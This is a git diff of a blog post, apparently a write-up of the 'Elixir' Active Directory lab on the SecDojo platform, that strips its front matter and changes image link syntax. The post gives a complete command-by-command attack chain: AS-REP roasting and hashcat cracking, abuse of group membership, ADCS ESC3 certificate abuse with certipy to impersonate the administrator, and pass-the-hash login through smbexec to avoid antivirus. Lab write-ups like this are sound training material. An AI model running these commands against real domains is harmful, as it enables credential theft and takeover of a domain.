@@ -1,20 +1,3 @@
----
-layout: post
-title: "Elixir"
-date: 2024-12-28
-author: d0s3nt
-categories: [Writeup, Secdojo]
-tags: [htb, writeup, security, ad, windows]
-pin: true
-math: true
-mermaid: true
-# image:
-#   path: /assets/img/commons/hackthebox.png
-#   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
-#   alt: Hackthebox Image
----
-
-Elixir is an easy machine on [secdojo platform](https://cyberlab.sec-dojo.com/en/labs/active)
 
 
 starting with nmap 
@@ -23,7 +6,7 @@ starting with nmap
 sudo nmap 10.8.0.2 -sC -sV -p- -oN nmap -T4
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011181947.png)
+![[Pasted image 20241011181947.png]]
 
 
 
@@ -65,7 +48,7 @@ the only attacks that comes in my mind at this moment is asreproasting
 impacket-GetNPUsers secdojo.local/ -usersfile users  -outputfile asrep
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011180718.png)
+![[Pasted image 20241011180718.png]]
 
 ```bash
  hashcat -a 0 asrep /usr/share/wordlists/rockyou.txt
@@ -83,7 +66,7 @@ RustHound/target/release/rusthound  -d secdojo.local -u 'Ad.Cr@secdojo.local' -p
 
 taking a look at bloodhound
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011181025.png)
+![[Pasted image 20241011181025.png]]
 
 
 we can add our controlled user to `HELPDESK Group`
@@ -94,41 +77,41 @@ net rpc group addmem "HelpDesk" "AD.CR" -U "secdojo.local"/"AD.CR"%"RockYou\!" -
 
 well , I was stuck here for long time 
 
-remember  : enumeration is iterative process which means when you got new user / group ...
+remember skid : enumeration is iterative process which means when you got new user / group ...
 
 I should redo the whole enumeration again , (Including ADCS).
 
-when running `Certipy` at first it didn't catch the `ESC3` , after adding my user to `helpdesk user` it does , because this group has the right to enroll this template 
+when running ==Certipy== at first it didn't catch the ==ESC3== , after adding my user to ==helpdesk ==user it does  
 
 ```bash
 certipy-ad find -u Ad.Cr -p 'RockYou!' -stdout  -dc-ip 10.8.0.2
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011182048.png)
+![[Pasted image 20241011182048.png]]
 
 ```bash
 certipy-ad req -u 'Ad.Cr@secdojo.local' -p 'RockYou!' -ca 'SecDojoRootCA' -template 'Enrollement' -dc-ip 10.8.0.2
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011182150.png)
+![[Pasted image 20241011182150.png]]
 
 ```bash
 certipy-ad req -u 'Ad.Cr@secodjo.local' -p 'RockYou!' -ca 'SecDojoRootCA'  -template 'User' -on-behalf-of 'administrator' -pfx ad.cr.pfx -dc-ip 10.8.0.2
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011182250.png)
+![[Pasted image 20241011182250.png]]
 
 ```bash
  certipy-ad auth -pfx administrator.pfx
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011182314.png)
+![[Pasted image 20241011182314.png]]
 
 
-the stupid AV will catch psexec :(
+the stupid AV will catch psexec
 ```bash
 impacket-smbexec secdojo.local/Administrator@10.8.0.2  -hashes :91c49c1fad45e7b9dbdcd7d3c44a880d
 ```
 
-![/home/user/myblog/_site](/assets/img/posts/Elixir/Pasted image 20241011183756.png)
+![[Pasted image 20241011183756.png]]
 
